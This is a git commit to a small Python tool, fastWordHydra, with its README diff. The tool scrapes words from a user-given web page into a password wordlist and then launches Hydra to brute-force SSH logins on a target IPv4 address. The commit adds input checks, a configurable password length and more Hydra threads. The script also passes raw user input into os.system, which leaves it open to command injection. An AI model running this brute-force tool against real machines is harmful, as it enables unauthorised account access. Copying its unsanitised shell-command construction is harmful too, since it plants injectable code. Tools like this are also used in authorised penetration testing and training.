b73e317cef4e8ac81dcb01e1c50f066e69f14338
Vinicius Campos Goulart <61381596+vinicgoulart@users.noreply.github.com>
2022-09-18 00:33:30 -0300

    Null input check, readme update
    In the version 1.1.0, a verification for null inputs was added, alongside with the option of the user being able to specify how long the password in wordlist should be. Readme is now updated.

--- README.md
+++ README.md
@@ -10,8 +10,8 @@ Python code that automates the process of web crawling and brute force attack wi
 -Root permissions in the terminal that is running the code.
 
 ## How it works
-<p>Firstly, the program will ask for a URL to curl. <b>DO NOT</b> forget to use "https://", as it is needed. This first part of the code will generate a wordlist that gets all possible passwords with a length greater than 6. </p>
-<p>After this, you will be asked if you want or not to run Hydra's brute force (Y to yes and N to to). Please note that if you want to execute Hydra's brute force, you will need the following: </p>
+<p>Firstly, the program will ask for a URL to curl. <b>DO NOT</b> forget to use "https://", as it is needed. This first part of the code will generate a wordlist that gets all possible passwords with a length greater or equal to the user's input (second input needed).</p>
+<p>After this, you will be asked if you want or not to run Hydra's brute force (Y to yes and N to no). Please note that if you want to execute Hydra's brute force, you will need the following: </p>
 -The possible username that will be used in the authentication; <br>
 -The full IpV4 address of the target machine. E.g. 192.168.0.1. <br><br>
 <p>On the other hand, if you choose not to run the brute force attack, the program will stop and the generated wordlist will be in the current folder named of "completeWordList.txt". </p>
--- fastWordHydra.py
+++ fastWordHydra.py
@@ -1,33 +1,44 @@
 #fastWordHydra
 #author: github.com/vinicgoulart
 #date: 09/10/2022
-#version 1.0.0
+#version 1.1.0
 import os
 
 simpleURI = input("Digite a URI \n")
+
+if not simpleURI: ## If the user didn't input the url
+    print("Não foi possível executar o comando")
+    quit()
+
+pass_length = int(input("Qual o tamanho das senhas? (a partir de ): \n"))
 
 sed = "sed 's/[^a-zA-Z ]/ /g'"
 
 tr = "tr 'A-Z ' 'a-z\\n'"
 
-grep = "grep -Eio '[a-z]{6,}'" ##gets only 6+ length passwords
+grep = "grep -Eio '[a-z]{" + str(pass_length) + ",}'"
 
-sort = "sort -u > completeWordList.txt" ##writes the wordlist to a file named completeWordList.txt in the current folder
+sort = "sort -u > completeWordList.txt" ## writes the wordlist to a file named completeWordList.txt in the current folder
 
 cmd = 'curl ' + '"' + simpleURI + '"' + " | " + sed + " | " + tr + " | " + grep + " | " + sort
 
-os.system(cmd) ##executes the command
+os.system(cmd) ## executes the command
 
-useHydra = input("Deseja aplicar a word list no hydra? \n")
+useHydra = input("Deseja aplicar a word list no hydra? Y/N \n")
 
 if str.lower(useHydra) == 'y':
     userName = input("Digite o possivel nome do usuário! \n")
     machineIp = input("Digite o endereço ipv4 da máquina com pontos. \n")
   
-    hydraCmd = "hydra -l " + userName + " -P completeWordList.txt -V -f -t 4 " + machineIp + " ssh" 
+    hydraCmd = "hydra -l " + userName + " -P completeWordList.txt -V -f -t 8 " + machineIp + " ssh" 
 
-    os.system(hydraCmd) ##execute hydra's brute force attack
+
+    if not userName or not machineIp:
+        print("As informações necessárias não foram preenchidas")
+        exit()
+
+    os.system(hydraCmd) ## execute hydra's brute force attack
 
 else:
-    print("terminando programa \n") ##ends the program.
+    print("terminando programa \n") ## ends the program.
     exit()
